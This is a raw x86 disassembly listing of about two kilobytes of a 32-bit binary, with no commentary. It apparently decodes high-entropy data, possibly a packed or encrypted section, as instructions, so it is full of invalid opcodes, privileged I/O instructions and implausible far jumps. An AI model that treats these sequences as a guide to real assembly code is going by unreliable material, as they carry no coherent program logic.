  40c5d8:	xor    eax,0xb953b815
  40c5dd:	push   eax
  40c5de:	outs   dx,BYTE PTR ds:[esi]
  40c5df:	daa    
  40c5e0:	add    bl,BYTE PTR [eax+eax*2+0xc5b7c59]
  40c5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5e8:	stc    
  40c5e9:	xor    DWORD PTR [edx-0x117bc0b0],edi
  40c5ef:	mov    al,ds:0xcc8d3ce2
  40c5f4:	jnp    0x40c610
  40c5f6:	test   BYTE PTR [edi],0xd0
  40c5f9:	in     al,0x67
  40c5fb:	mov    eax,edx
  40c5fd:	dec    edi
  40c5fe:	sub    DWORD PTR [esi+ebp*2-0x670ec2b7],ebp
  40c605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c606:	xchg   DWORD PTR [ecx+ebx*4],edx
  40c609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c60a:	xor    ebp,DWORD PTR [ecx]
  40c60c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c60d:	cld    
  40c60e:	sbb    esi,DWORD PTR [ebx]
  40c610:	cs xchg esp,eax
  40c612:	mov    bh,0xa0
  40c614:	adc    edx,DWORD PTR [eax-0x78]
  40c617:	(bad)  
  40c618:	lods   al,BYTE PTR ds:[esi]
  40c619:	sbb    DWORD PTR [edx+0x40],edi
  40c61c:	je     0x40c65d
  40c61e:	pop    ss
  40c61f:	popa   
  40c620:	pop    ebp
  40c621:	inc    ecx
  40c622:	in     eax,0x27
  40c624:	and    BYTE PTR [edi+ecx*2-0x7a],bl
  40c628:	aas    
  40c629:	push   edi
  40c62a:	mov    al,ds:0x2635dfe0
  40c62f:	sub    al,0xed
  40c631:	mov    bl,0xcd
  40c633:	jle    0x40c64c
  40c635:	fistp  DWORD PTR [esi-0x45]
  40c638:	mov    dh,BYTE PTR [eax+0x471e94c8]
  40c63e:	arpl   WORD PTR [ebx+edi*4],bp
  40c641:	sti    
  40c642:	cli    
  40c643:	inc    eax
  40c644:	cld    
  40c645:	ins    DWORD PTR es:[edi],dx
  40c646:	addr16 ret 0xddf6
  40c64a:	dec    edx
  40c64b:	xor    BYTE PTR [eax-0x68],dh
  40c64e:	adc    BYTE PTR [ebx],bl
  40c650:	lods   al,BYTE PTR ds:[esi]
  40c651:	jns    0x40c6c4
  40c653:	xchg   esi,eax
  40c654:	push   edi
  40c655:	mov    edx,0xe863660
  40c65a:	sahf   
  40c65b:	mov    ah,0xe1
  40c65d:	xor    BYTE PTR [ecx],dh
  40c65f:	mov    ah,BYTE PTR [edi-0x11243c4d]
  40c665:	xchg   ebp,eax
  40c666:	iret   
  40c667:	addr16 adc eax,0x44fff31e
  40c66d:	pushf  
  40c66e:	imul   ebx,DWORD PTR [ebp+0x16],0xffffff97
  40c672:	push   0xffffffb0
  40c674:	into   
  40c675:	dec    ecx
  40c676:	(bad)  
  40c678:	popf   
  40c679:	mov    ecx,0xee0cdcf3
  40c67e:	gs cmc 
  40c680:	jno    0x40c607
  40c682:	adc    bl,BYTE PTR ds:0x46f8f8a8
  40c688:	mov    eax,0xe70442b6
  40c68d:	add    al,dl
  40c68f:	inc    esp
  40c690:	pop    ds
  40c691:	pusha  
  40c692:	push   ss
  40c693:	mul    BYTE PTR [edi-0x190bd152]
  40c699:	push   0x78
  40c69b:	sbb    al,0xbc
  40c69d:	fwait
  40c69e:	leave  
  40c69f:	or     eax,0xcebb3229
  40c6a4:	xor    ah,BYTE PTR [ebx+0x2c74540e]
  40c6aa:	dec    esi
  40c6ab:	mov    ds:0x27b22c50,al
  40c6b0:	adc    bl,cl
  40c6b2:	and    ebp,DWORD PTR [ebp-0x5b230ecc]
  40c6b8:	fstp   DWORD PTR [ecx+0x2a]
  40c6bb:	mov    bh,0x13
  40c6bd:	hlt    
  40c6be:	add    edi,DWORD PTR [ecx+0x3f]
  40c6c1:	mov    edx,0xaf54d19f
  40c6c6:	out    dx,al
  40c6c7:	in     al,dx
  40c6c8:	push   ss
  40c6c9:	mov    ds:0x718c14b1,eax
  40c6ce:	cmp    DWORD PTR [ecx+0xacf36d0],ebp
  40c6d4:	inc    BYTE PTR [ecx-0x4fab2acf]
  40c6da:	cwde   
  40c6db:	xor    cl,bl
  40c6dd:	dec    DWORD PTR [eax]
  40c6df:	xor    eax,0x2bef794e
  40c6e4:	retf   0x99a1
  40c6e7:	repz dec edi
  40c6e9:	mov    es,edx
  40c6eb:	test   bl,dl
  40c6ed:	mov    esi,DWORD PTR [edi-0x32]
  40c6f0:	adc    al,0x47
  40c6f2:	xor    DWORD PTR [esi+0x20],esi
  40c6f5:	adc    DWORD PTR [ebp+ebx*8-0x5af9890c],eax
  40c6fc:	adc    ebx,DWORD PTR [ebp-0x431d70d3]
  40c702:	mov    cl,0x68
  40c704:	adc    dh,BYTE PTR [edx]
  40c706:	gs jae 0x40c75f
  40c709:	add    eax,esp
  40c70b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c70c:	fisub  DWORD PTR [ebx-0x4d66d642]
  40c712:	mov    esp,0x44ba32a5
  40c717:	pop    ds
  40c718:	fadd   DWORD PTR [eax-0x2e]
  40c71b:	xor    BYTE PTR [ecx+0x45690172],cl
  40c721:	(bad)  
  40c722:	fcomp  QWORD PTR [eax-0x2d2548ae]
  40c728:	xor    bh,0xf7
  40c72b:	jnp    0x40c76b
  40c72d:	repnz fxch st(1)
  40c730:	clc    
  40c731:	loopne 0x40c6cb
  40c733:	xor    eax,0x388db290
  40c738:	gs cli 
  40c73a:	sub    al,0xff
  40c73c:	not    DWORD PTR [ebp-0x58]
  40c73f:	push   ds
  40c740:	scas   eax,DWORD PTR es:[edi]
  40c741:	add    DWORD PTR [edx+0x19d1faee],ecx
  40c747:	ins    DWORD PTR es:[edi],dx
  40c748:	add    al,0xa3
  40c74a:	jb     0x40c78b
  40c74c:	mov    dh,0x6f
  40c74e:	or     bh,BYTE PTR [ebx]
  40c750:	fisttp WORD PTR [edx]
  40c752:	add    ecx,DWORD PTR [edx+0x149a855a]
  40c758:	xchg   ebx,eax
  40c759:	or     dh,BYTE PTR [ebx-0x1]
  40c75c:	inc    ebx
  40c75d:	retf   
  40c75e:	loop   0x40c70a
  40c760:	or     ecx,ebp
  40c762:	jno    0x40c747
  40c764:	cmp    BYTE PTR [edi],ch
  40c766:	push   es
  40c767:	cmc    
  40c768:	nop
  40c769:	adc    eax,0x2be24320
  40c76e:	or     edx,DWORD PTR cs:[ebp-0x7c6493fb]
  40c775:	mov    edx,0xa2927674
  40c77a:	fwait
  40c77b:	cmp    edx,ebp
  40c77d:	arpl   dx,bp
  40c77f:	(bad)  
  40c780:	sub    BYTE PTR [ebp+0x1c58a5a0],dh
  40c786:	ds push ebx
  40c788:	gs sbb dh,al
  40c78b:	loope  0x40c72c
  40c78d:	push   es
  40c78e:	mov    ch,0xbe
  40c790:	mov    bh,0x92
  40c792:	sbb    cl,dh
  40c794:	cmc    
  40c795:	ja     0x40c802
  40c797:	cmp    ecx,DWORD PTR [ecx-0x3f]
  40c79a:	adc    DWORD PTR ds:0x5c8de490,edi
  40c7a0:	imul   eax,edi,0xffffff9d
  40c7a3:	popa   
  40c7a4:	ficom  WORD PTR [eax+0x44194321]
  40c7aa:	cs xchg edx,eax
  40c7ac:	cs dec edx
  40c7ae:	pushf  
  40c7af:	iret   
  40c7b0:	(bad)  
  40c7b1:	mov    bp,0xa170
  40c7b5:	and    al,0xbd
  40c7b7:	into   
  40c7b8:	sub    dh,dl
  40c7ba:	push   ds
  40c7bb:	loope  0x40c7cb
  40c7bd:	and    BYTE PTR [ebx],al
  40c7bf:	push   esp
  40c7c0:	mov    al,ds:0xe068c2a5
  40c7c5:	scas   eax,DWORD PTR es:[edi]
  40c7c6:	out    0x8a,eax
  40c7c8:	adc    edx,DWORD PTR [esi-0x6b04b6d7]
  40c7ce:	dec    ebp
  40c7cf:	es or  al,0x96
  40c7d2:	and    BYTE PTR [ebx],ch
  40c7d4:	pop    ds
  40c7d5:	xchg   ebp,eax
  40c7d6:	(bad)  
  40c7d7:	rol    dh,1
  40c7d9:	mov    edx,0x51197420
  40c7de:	inc    eax
  40c7df:	nop    DWORD PTR [ebx+eax*4]
  40c7e3:	out    dx,al
  40c7e4:	aad    0x70
  40c7e6:	jmp    0x5326:0x13a83bc0
  40c7ed:	inc    esi
  40c7ee:	fsub   QWORD PTR [eax+0x60]
  40c7f1:	jnp    0x40c836
  40c7f3:	shr    BYTE PTR [edx],cl
  40c7f5:	push   ebp
  40c7f6:	clc    
  40c7f7:	std    
  40c7f8:	add    DWORD PTR [edi-0x376acd42],ebp
  40c7fe:	mov    al,ds:0x54ce3b16
  40c803:	mov    ch,BYTE PTR [ebp-0x1e227232]
  40c809:	(bad)  [edx+0x3cac835a]
  40c80f:	pop    edi
  40c810:	xchg   edx,eax
  40c811:	out    dx,al
  40c812:	jb     0x40c802
  40c814:	add    cl,cl
  40c816:	or     DWORD PTR ds:0x2490cf7d,edx
  40c81c:	stos   DWORD PTR es:[edi],eax
  40c81d:	push   ebx
  40c81e:	mov    eax,0xf68d6d03
  40c823:	pop    ebp
  40c824:	mov    dl,0x6b
  40c826:	push   es
  40c827:	(bad)  
  40c828:	test   eax,0xeb990d5b
  40c82d:	push   ebp
  40c82e:	repnz sub bh,cl
  40c831:	pop    esi
  40c832:	pushf  
  40c833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c834:	inc    edx
  40c835:	mov    edi,0xafd0e2c6
  40c83a:	add    ah,BYTE PTR [eax*1-0x7acbb3bc]
  40c841:	mov    edx,0xb7054b6b
  40c846:	retf   
  40c847:	and    BYTE PTR [esp+edx*2+0x536dd373],cl
  40c84e:	fstp   TBYTE PTR [ecx]
  40c850:	pop    edx
  40c851:	mov    eax,ds:0x96a3b861
  40c856:	mov    dl,0x28
  40c858:	out    0x84,eax
  40c85a:	lea    ebx,[edi+0x71]
  40c85d:	mov    eax,0xbf05c05
  40c862:	jne    0x40c8bb
  40c864:	mov    ch,0x13
  40c866:	arpl   bp,ax
  40c868:	pop    ds
  40c869:	add    al,0x81
  40c86b:	stos   DWORD PTR es:[edi],eax
  40c86c:	cs pop ebx
  40c86e:	loop   0x40c866
  40c870:	shufps xmm0,XMMWORD PTR [esi],0xbf
  40c874:	xchg   edx,eax
  40c875:	loop   0x40c844
  40c877:	mov    esi,0x6c393bc5
  40c87c:	push   esp
  40c87e:	dec    edi
  40c87f:	dec    eax
  40c880:	test   bl,dl
  40c882:	mov    al,0x87
  40c884:	mov    ds:0x375a7ff0,al
  40c889:	out    dx,eax
  40c88a:	dec    esi
  40c88b:	popa   
  40c88c:	mov    dl,BYTE PTR [ecx+0x21f9ef60]
  40c892:	xor    eax,0xad21cb06
  40c897:	xchg   edi,eax
  40c898:	sub    al,0xee
  40c89a:	ins    BYTE PTR es:[edi],dx
  40c89b:	lahf   
  40c89c:	imul   esp,DWORD PTR [esi],0x67
  40c89f:	out    dx,eax
  40c8a0:	stc    
  40c8a1:	push   ebx
  40c8a2:	sbb    al,0xab
  40c8a4:	retf   
  40c8a5:	shl    DWORD PTR [esi],cl
  40c8a7:	sub    BYTE PTR fs:[esi],bl
  40c8aa:	push   ss
  40c8ab:	rol    al,cl
  40c8ad:	mov    bl,0x1f
  40c8af:	pop    ebx
  40c8b0:	mov    dh,0x5
  40c8b2:	es mov edx,0xf10ec699
  40c8b8:	inc    eax
  40c8b9:	cmp    ebp,ecx
  40c8bb:	stos   BYTE PTR es:[edi],al
  40c8bc:	mov    al,ds:0x357e98b9
  40c8c1:	cmp    ah,dl
  40c8c3:	jl     0x40c859
  40c8c5:	mov    ecx,0x4bf1aa7e
  40c8ca:	push   ebx
  40c8cb:	js     0x40c89a
  40c8cd:	mov    eax,ds:0xe5c0d63
  40c8d2:	out    dx,al
  40c8d3:	adc    esi,DWORD PTR ds:0x7e96c67b
  40c8d9:	popa   
  40c8da:	pusha  
  40c8db:	(bad)  
  40c8dc:	cdq    
  40c8dd:	adc    ecx,DWORD PTR [ebx-0x74]
  40c8e0:	adc    DWORD PTR [ecx-0x683af52e],ebx
  40c8e6:	hlt    
  40c8e7:	pusha  
  40c8e8:	lods   al,BYTE PTR ds:[esi]
  40c8e9:	out    0x32,eax
  40c8eb:	mov    ebx,0x6e0a755a
  40c8f0:	xchg   sp,sp
  40c8f3:	jo     0x40c948
  40c8f5:	pusha  
  40c8f6:	ds xchg esi,eax
  40c8f8:	mov    esp,0x36be36ca
  40c8fd:	jne    0x40c8a8
  40c8ff:	jmp    0x40c902
  40c901:	lea    ecx,[edi]
  40c903:	lock add al,0x7f
  40c906:	add    DWORD PTR [edx],ecx
  40c908:	and    edi,DWORD PTR [edi-0x5e4a4e68]
  40c90e:	int3   
  40c90f:	popa   
  40c910:	push   ebx
  40c911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c912:	sbb    ebp,DWORD PTR [eax]
  40c914:	aad    0xd
  40c916:	xchg   ecx,eax
  40c917:	ret    
  40c918:	nop
  40c919:	cwde   
  40c91a:	cmp    cl,dh
  40c91c:	inc    ecx
  40c91d:	nop
  40c91e:	xchg   dl,ch
  40c920:	aas    
  40c921:	bound  edx,QWORD PTR [edx-0x2303ee85]
  40c927:	sbb    eax,0xe118cf43
  40c92c:	ror    ecx,1
  40c92e:	lock and eax,0xe7a33495
  40c934:	and    DWORD PTR [ecx-0x68],edi
  40c937:	jns    0x40c90a
  40c939:	add    edi,ebp
  40c93b:	xchg   esp,eax
  40c93c:	and    al,0xcf
  40c93e:	xchg   edi,eax
  40c93f:	hlt    
  40c940:	mov    BYTE PTR [eax-0x2e],al
  40c943:	adc    al,0xa5
  40c945:	dec    edx
  40c946:	xchg   ebp,eax
  40c947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c948:	addr16 mov ebp,0x501aafdc
  40c94e:	dec    esi
  40c94f:	stc    
  40c950:	inc    esi
  40c951:	push   edi
  40c952:	mov    ebp,?
  40c954:	je     0x40c995
  40c956:	add    ecx,DWORD PTR [ebp-0x1160e626]
  40c95c:	stos   BYTE PTR es:[edi],al
  40c95d:	mov    DWORD PTR [edx+0x4c],ecx
  40c960:	xchg   ecx,eax
  40c961:	inc    esp
  40c962:	fisub  DWORD PTR [eax]
  40c964:	aas    
  40c965:	inc    ebp
  40c966:	pop    edi
  40c967:	sbb    ah,BYTE PTR [ebx-0x75c20ca9]
  40c96d:	scas   eax,DWORD PTR es:[edi]
  40c96e:	or     al,0x6e
  40c970:	aas    
  40c971:	rep stos BYTE PTR es:[edi],al
  40c973:	test   al,0xe0
  40c975:	sbb    DWORD PTR [edx+0x2d],edx
  40c978:	push   edx
  40c979:	fldenv [ebx-0x7e976e46]
  40c97f:	push   0x69
  40c981:	and    edx,DWORD PTR [ebx+0x2c]
  40c984:	sbb    eax,DWORD PTR [ecx-0x6b]
  40c987:	mov    edx,0xbd8ce4d6
  40c98c:	mov    al,0xb5
  40c98e:	std    
  40c98f:	out    0x4,al
  40c991:	retf   0xc451
  40c994:	mov    DWORD PTR [edx+eiz*2+0x10],ebp
  40c998:	test   al,0x3c
  40c99a:	test   DWORD PTR [edi],ecx
  40c99c:	and    dh,BYTE PTR ds:0xae35d767
  40c9a2:	sbb    eax,0x258d96ce
  40c9a7:	icebp  
  40c9a8:	scas   eax,DWORD PTR es:[edi]
  40c9a9:	dec    ebx
  40c9aa:	and    eax,0x350e5c2d
  40c9af:	jl     0x40c97c
  40c9b1:	lods   eax,DWORD PTR ds:[esi]
  40c9b2:	inc    edx
  40c9b3:	add    ch,BYTE PTR [edx+0x2703ff2e]
  40c9b9:	aam    0x23
  40c9bb:	out    0x2,eax
  40c9bd:	push   cs
  40c9be:	jb     0x40c968
  40c9c0:	int    0x13
  40c9c2:	dec    esp
  40c9c3:	ins    BYTE PTR es:[edi],dx
  40c9c4:	pop    ds
  40c9c5:	push   edi
  40c9c6:	pushf  
  40c9c7:	iret   
  40c9c8:	pop    ebp
  40c9c9:	cmp    ebp,DWORD PTR [ebx+0x56]
  40c9cc:	xchg   ebx,eax
  40c9cd:	inc    eax
  40c9ce:	in     al,dx
  40c9cf:	scas   al,BYTE PTR es:[edi]
  40c9d0:	sbb    BYTE PTR cs:[ecx+0x3d],0x5f
  40c9d5:	(bad)  
  40c9d6:	sahf   
  40c9d7:	push   ds
  40c9d8:	lods   al,BYTE PTR ds:[esi]
  40c9d9:	(bad)  
  40c9da:	in     eax,0xea
  40c9dc:	ja     0x40c9bd
  40c9de:	and    BYTE PTR [ebp+0x3612db02],dl
  40c9e4:	add    BYTE PTR [esi-0x13f650df],ch
  40c9ea:	xchg   edx,eax
  40c9eb:	jnp    0x40ca0f
  40c9ed:	mov    edi,0xb2264c64
  40c9f2:	cld    
  40c9f3:	xchg   edi,eax
  40c9f4:	push   ebx
  40c9f5:	pop    es
  40c9f6:	sbb    eax,0xcd03d4b0
  40c9fb:	dec    ecx
  40c9fc:	(bad)  
  40c9fd:	sub    DWORD PTR [ebx],esi
  40c9ff:	(bad)
  40ca03:	aas    
  40ca04:	xchg   edi,eax
  40ca05:	and    bh,BYTE PTR ds:0x19affa27
  40ca0b:	daa    
  40ca0c:	or     BYTE PTR [esi-0x4dfa162b],0xb9
  40ca13:	pop    ds
  40ca14:	cmp    eax,0x2f78134d
  40ca19:	in     al,dx
  40ca1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca1b:	jecxz  0x40ca99
  40ca1d:	inc    edi
  40ca1e:	xchg   ebp,eax
  40ca1f:	xchg   esi,eax
  40ca20:	add    al,cl
  40ca22:	aas    
  40ca23:	js     0x40ca53
  40ca25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca26:	lahf   
  40ca27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca28:	sbb    al,0x31
  40ca2a:	add    BYTE PTR [ebx],al
  40ca2c:	cmp    eax,0x256a8ed
  40ca31:	cmp    al,0xbf
  40ca33:	stos   BYTE PTR es:[edi],al
  40ca34:	push   cs
  40ca35:	test   al,0xf8
  40ca37:	mov    ds:0xa530b281,eax
  40ca3c:	ret    
  40ca3d:	retf   0xb64e
  40ca40:	pushf  
  40ca41:	xor    bh,ch
  40ca43:	shld   DWORD PTR [edi+0x7e48660c],edi,cl
  40ca4a:	mov    eax,ds:0xd5b31736
  40ca4f:	push   edx
  40ca50:	aaa    
  40ca51:	into   
  40ca52:	fbstp  TBYTE PTR [ecx]
  40ca54:	ss push ds
  40ca56:	out    dx,al
  40ca57:	lock sar eax,0xc1
  40ca5b:	sub    DWORD PTR [edx*4-0x754fed45],ecx
  40ca62:	add    eax,0x6e3ff9e0
  40ca67:	shr    DWORD PTR [eax+ebp*8-0x34],cl
  40ca6b:	sub    DWORD PTR [eax+ecx*2],esi
  40ca6e:	push   0x25
  40ca70:	(bad)  
  40ca71:	xchg   edi,eax
  40ca72:	repnz out 0x82,eax
  40ca75:	mov    ch,0x32
  40ca77:	and    BYTE PTR [edx-0x55],ch
  40ca7a:	ror    BYTE PTR [ecx+0x13dcd19b],1
  40ca80:	sbb    al,0x78
  40ca82:	mov    edx,0xe2d36f24
  40ca87:	mov    edx,0xe026f44
  40ca8c:	pcmpgtw mm2,QWORD PTR [ebp+0x69bc90f0]
  40ca93:	(bad)  
  40ca94:	cld    
  40ca95:	mov    ch,0xea
  40ca97:	cmp    esi,edi
  40ca99:	jge    0x40ca33
  40ca9b:	sub    BYTE PTR [eax+0x7f],0x61
  40ca9f:	mov    ebx,0x9377b1c4
  40caa4:	icebp  
  40caa5:	shl    BYTE PTR [edx],1
  40caa7:	fsubr  DWORD PTR [edi+ecx*8+0x4]
  40caab:	dec    ecx
  40caac:	popw   ds
  40caae:	test   al,0x2d
  40cab0:	pop    edx
  40cab1:	xor    al,0x15
  40cab3:	and    edi,DWORD PTR [ebx]
  40cab5:	xor    eax,0xffffff8b
  40cab8:	adc    DWORD PTR [eax],edx
  40caba:	arpl   WORD PTR [ecx+edi*4+0x72],cx
  40cabe:	dec    ebp
  40cabf:	ror    ah,0xff
  40cac2:	xlat   BYTE PTR ds:[ebx]
  40cac3:	inc    esi
  40cac4:	xor    al,0x14
  40cac6:	jge    0x40cae1
  40cac8:	sub    eax,0xc53d07cc
  40cacd:	mov    ebp,0x53e58eb1
  40cad2:	jle    0x40cac6
  40cad4:	adc    al,BYTE PTR [eax-0x3e538d93]
  40cada:	pop    edx
  40cadb:	icebp  
  40cadc:	jmp    0x40cb4a
  40cade:	stos   DWORD PTR es:[edi],eax
  40cadf:	pop    ecx
  40cae0:	rcl    DWORD PTR [ebx],0x60
  40cae3:	(bad)  
  40cae4:	fcomp  QWORD PTR [ecx-0x79]
  40cae7:	std    
  40cae8:	icebp  
  40cae9:	lock pop ss
  40caeb:	je     0x40cab0
  40caed:	mov    WORD PTR [edi-0x62429722],cs
  40caf3:	inc    ebp
  40caf4:	in     al,dx
  40caf5:	and    eax,0xaef60f8
  40cafa:	mov    ds:0x10c0706b,eax
  40caff:	inc    BYTE PTR [ecx-0x6a1916b5]
  40cb05:	in     eax,0x1
  40cb07:	js     0x40caf8
  40cb09:	inc    esp
  40cb0a:	push   ds
  40cb0b:	in     eax,0x5f
  40cb0d:	sahf   
  40cb0e:	or     edx,DWORD PTR gs:[ebx+0x2c577046]
  40cb15:	popa   
  40cb16:	rcr    BYTE PTR [ebx-0x2b],0x7f
  40cb1a:	jp     0x40caf9
  40cb1c:	mov    ebx,0xb6bdde99
  40cb21:	test   al,0xee
  40cb23:	imul   ebp
  40cb25:	inc    edi
  40cb26:	iret   
  40cb27:	pusha  
  40cb28:	rcl    eax,0xf4
  40cb2b:	aas    
  40cb2c:	(bad)  
  40cb2e:	push   ds
  40cb2f:	(bad)  
  40cb31:	xchg   ebx,eax
  40cb32:	push   eax
  40cb33:	daa    
  40cb34:	mov    edi,0x2543fb3f
  40cb39:	call   0xc955:0xd28c4c14
  40cb40:	mov    dh,0x9d
  40cb42:	retf   0xf5e5
  40cb45:	inc    esi
  40cb46:	mov    esp,0xe9703b6b
  40cb4b:	pop    eax
  40cb4c:	xor    ah,0xa1
  40cb4f:	daa    
  40cb50:	jb     0x40cb3b
  40cb52:	in     al,0x33
  40cb54:	pop    ss
  40cb55:	std    
  40cb56:	pop    eax
  40cb57:	mov    bh,0x5d
  40cb59:	pop    ebp
  40cb5a:	cs int3 
  40cb5c:	cmc    
  40cb5d:	jb     0x40cb86
  40cb5f:	popa   
  40cb60:	or     ch,bh
  40cb62:	mov    ds:0xd21bc87e,al
  40cb67:	mov    esi,0x94f4570c
  40cb6c:	lods   eax,DWORD PTR ds:[esi]
  40cb6d:	jmp    0xf77d:0xf1ce5c32
  40cb74:	dec    edx
  40cb75:	push   ebx
  40cb76:	sti    
  40cb77:	fs jle 0x40cb01
  40cb7a:	inc    ebx
  40cb7b:	sbb    BYTE PTR [eax-0x158b01e1],ch
  40cb81:	je     0x40cb05
  40cb83:	pop    esp
  40cb84:	mov    edx,0xc62fcc61
  40cb89:	or     edi,eax
  40cb8b:	in     al,0x69
  40cb8d:	mov    ds:0xc932afa8,al
  40cb92:	pop    esp
  40cb93:	push   edx
  40cb94:	mov    BYTE PTR [ecx+0x1dfc1696],bl
  40cb9a:	jecxz  0x40cb9a
  40cb9c:	xchg   edi,eax
  40cb9d:	retf   0x1e97
  40cba0:	std    
  40cba1:	xor    bl,bh
  40cba3:	clc    
  40cba4:	into   
  40cba5:	push   ebx
  40cba6:	into   
  40cba7:	inc    eax
  40cba8:	pop    ds
  40cba9:	into   
  40cbaa:	dec    edx
  40cbab:	pop    ebp
  40cbac:	adc    al,0xe1
  40cbae:	add    ecx,ecx
  40cbb0:	push   edi
  40cbb1:	push   ss
  40cbb2:	jmp    0xf5e8613c
  40cbb7:	neg    bh
  40cbb9:	mov    al,ds:0x737532c8
  40cbbe:	pop    ebx
  40cbbf:	test   al,0xd6
  40cbc1:	push   es
  40cbc2:	pop    esi
  40cbc3:	dec    eax
  40cbc4:	cs (bad) 
  40cbc6:	and    eax,0x4b95cd5b
  40cbcb:	jge    0x40cc1c
  40cbcd:	xor    DWORD PTR [edx],ebx
  40cbcf:	loop   0x40cb85
  40cbd1:	or     al,0xa2
  40cbd3:	stos   BYTE PTR es:[edi],al
  40cbd4:	xchg   DWORD PTR [ebx+0x47],esp
  40cbd7:	in     ax,dx
  40cbd9:	inc    ebp
  40cbda:	fist   DWORD PTR [ebx-0x33]
  40cbdd:	imul   esi,DWORD PTR [edx+0x7c7d5fa9],0x5677eb41
  40cbe7:	les    esp,FWORD PTR es:[eax+0x659f29ed]
  40cbee:	loopne 0x40cc69
  40cbf0:	dec    ebp
  40cbf1:	ins    BYTE PTR es:[edi],dx
  40cbf2:	mov    bl,0x79
  40cbf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbf5:	add    DWORD PTR [edi],edx
  40cbf7:	aas    
  40cbf8:	push   edx
  40cbf9:	mov    eax,0xf8190a6f
  40cbfe:	inc    esp
  40cbff:	lock or edi,esp
  40cc02:	fld    QWORD PTR [eax+esi*4-0x77bdfa7b]
  40cc09:	and    al,0xb6
  40cc0b:	test   eax,0x6dccbc12
  40cc10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc11:	xor    al,0x65
  40cc13:	xchg   ebx,eax
  40cc14:	scas   eax,DWORD PTR es:[edi]
  40cc15:	adc    edx,0xffffffeb
  40cc18:	cmp    eax,0xfbb11ac0
  40cc1d:	das    
  40cc1e:	xor    DWORD PTR [edi-0x28a5dfc3],esi
  40cc24:	dec    ecx
  40cc25:	xor    al,0x24
  40cc27:	sar    ebp,1
  40cc29:	lock mov BYTE PTR [ecx],bl
  40cc2c:	mov    ah,0x6b
  40cc2e:	popf   
  40cc2f:	inc    ebx
  40cc30:	sbb    bh,BYTE PTR [edx-0x3064d18b]
  40cc36:	adc    al,0x5e
  40cc38:	ja     0x40cc84
  40cc3a:	mov    bl,0xf6
  40cc3c:	xchg   esi,eax
  40cc3d:	adc    eax,0x9e6780af
  40cc42:	scas   al,BYTE PTR es:[edi]
  40cc43:	dec    ebx
  40cc44:	pop    edi
  40cc45:	xchg   esi,eax
  40cc46:	test   eax,0x82192381
  40cc4b:	cli    
  40cc4c:	inc    eax
  40cc4d:	push   es
  40cc4e:	fild   QWORD PTR [ebp-0x89c480]
  40cc54:	mov    DWORD PTR [esi+0x1fdfeeec],eax
  40cc5a:	xchg   ecx,eax
  40cc5b:	pop    esp
  40cc5c:	push   ds
  40cc5d:	repnz stc 
  40cc5f:	outs   dx,DWORD PTR ds:[esi]
  40cc60:	test   DWORD PTR [ebx+0x19],0xd28d3b2e
  40cc67:	outs   dx,DWORD PTR ds:[esi]
  40cc68:	push   edx
  40cc69:	mov    cl,0xff
  40cc6b:	in     al,dx
  40cc6c:	xchg   ebx,eax
  40cc6d:	mov    ecx,0x52f17115
  40cc72:	jp     0x40cc37
  40cc74:	es in  eax,0xeb
  40cc77:	call   0x9149:0x24628dd4
  40cc7e:	push   ecx
  40cc7f:	mul    DWORD PTR [esi+ecx*1+0x4e4ca270]
  40cc86:	jne    0x40ccb5
  40cc88:	mov    ch,BYTE PTR [edi-0x4f22933f]
  40cc8e:	std    
  40cc8f:	inc    esi
  40cc90:	int3   
  40cc91:	cli    
  40cc92:	test   BYTE PTR [ecx],dh
  40cc94:	out    dx,al
  40cc95:	xor    dl,bh
  40cc97:	sahf   
  40cc98:	fist   WORD PTR ds:0x4416f4e0
  40cc9e:	inc    esp
  40cc9f:	xor    esp,DWORD PTR ds:0x646394a3
  40cca5:	pop    eax
  40cca6:	pop    edx
  40cca7:	mov    cl,0x4c
  40cca9:	add    edi,DWORD PTR [eax]
  40ccab:	int3   
  40ccac:	cs cdq 
  40ccae:	mov    dl,0xf2
  40ccb0:	dec    esi
  40ccb1:	push   edi
  40ccb2:	cld    
  40ccb3:	sbb    DWORD PTR [edi-0x67],edi
  40ccb6:	xor    al,0x95
  40ccb9:	test   eax,0x6bcacaa7
  40ccbe:	js     0x40ccf5
  40ccc0:	(bad)  
  40ccc1:	repnz cmp ebp,DWORD PTR [eax-0x1b]
  40ccc5:	aam    0x61
  40ccc7:	push   esp
  40ccc8:	push   0x5a876092
  40cccd:	push   edx
  40ccce:	loopne 0x40cd37
  40ccd0:	jb     0x40cc68
  40ccd2:	pusha  
  40ccd3:	inc    eax
  40ccd4:	push   0xf1879209
  40ccd9:	cmp    al,0x8c
  40ccdb:	mov    WORD PTR [edx+0x1d],gs
  40ccde:	loope  0x40cd1e
  40cce0:	push   ecx
  40cce1:	jmp    0x8d136ab6
  40cce6:	add    BYTE PTR [eax+0x5e95b19f],bh
  40ccec:	(bad)  
  40cced:	mov    bh,0x53
  40ccef:	in     al,0x24
  40ccf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccf2:	xor    BYTE PTR [ebx+0x42],dl
  40ccf5:	test   BYTE PTR [edi+0xd],ch
  40ccf8:	enter  0x7bad,0x20
  40ccfc:	ss aad 0x7c
  40ccff:	or     dl,BYTE PTR [ebx]
  40cd01:	test   al,0x20
  40cd03:	in     al,dx
  40cd04:	test   BYTE PTR [edx-0x3841b20a],ah
  40cd0a:	jecxz  0x40cce6
  40cd0c:	inc    esp
  40cd0d:	imul   DWORD PTR [esi+0x6180fd9e]
  40cd13:	push   ecx
  40cd14:	popa   
  40cd15:	lods   al,BYTE PTR ds:[esi]
  40cd16:	enter  0x1ae8,0x89
  40cd1a:	mov    esp,0x3addcc9a
  40cd1f:	mov    cl,0x1a
  40cd21:	xchg   ecx,eax
